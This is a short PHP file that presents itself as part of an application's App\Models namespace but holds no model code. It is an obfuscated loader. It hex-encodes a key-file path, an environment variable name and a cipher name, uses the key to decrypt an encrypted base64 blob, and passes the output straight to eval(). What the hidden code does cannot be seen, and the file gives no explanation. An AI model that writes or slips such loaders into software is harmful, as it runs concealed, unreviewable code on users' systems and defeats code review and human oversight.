<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('SfnJVeoh4mekQL10CWVbYA==');

$c=base64_decode(

'/S4N9mvxc3Oj6nUHJhKGc3TvPaYymyA1jkH6WYdL7r/mCGmaRggdJMOi8YgWqbVR3vhYKEB4RLP/' .
'88H5ZSvh9o6VnwEjxSooOLusBmAkXPiD47Yf4xsvAZHK2dBGBBw5lnlzqcsBOEjC/GT66Ekw0Fnd' .
'V+7FVjogd+6AQNvsctKvCQtl+keLk1XSRKafVQCDmvjUPBesd8EFF3xs+gFhzCPP1AR6qTtW/pIx' .
'seGlbdhDCjmGpExmscTX5lPvqL1AMiTyDGxYCPWYxFD12GKYEJd1BeC9E4Mb/zEQEjziYGUXdSPC' .
'cCYBWNl4gRpS78MUHnRmSpbGrkSBTpVVeGrLpZLvS9tApnvw+jPTqfrpyc4k8BHoDa7r1BzVCoqw' .
'o8pvMeDuos80BrdatM9Syypivo28/f2HilNO4hYTAGhLC16amt0lASbU9n7RrnEkjjwGq8+gQ5Ed' .
'4HnGRQDcdnSPNgxRR9fisqtjUKwJHQRRbq2OIOpoE6k/Fz7KvzKLL3PDSLebtVDvOPAiFriu2F2v' .
'Mcur26u/3Y+lq79Q3/gj00+ACnWQlPqRXTVi/CtOl+Cd6P/cjHoaRJBKc8PDJpsCkZxhcMmgDo1a' .
'gXXmYt3cm2YMsdRlzjtwUdJ7hTpzT0WOBRNcOZSygNcv/sWEsh6bi4HkkMG4GouSTvzxtsPo1m/x' .
'evZK6wWoUD6uW0WYLSTJ3rrbTVVJRKgNiWH6qFHRyfjOTgeLi+2Qie6irmx9Rh9eZ3gVbJzisKFk' .
'3bd/NyG/0dvpJWMaIdAijSH+m9gMSmYBPkCPj768FbBvTsSeHVgzZOUgqAbTSFBEF+r6uZBeX940' .
'OgRLeviHeO9jXmPeIMfzr2H8s97tCB48B5NlVEXQJottY7n7SGxvIeWds2EI5HtcwnB8R8iceG8i' .
'no7ZEg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

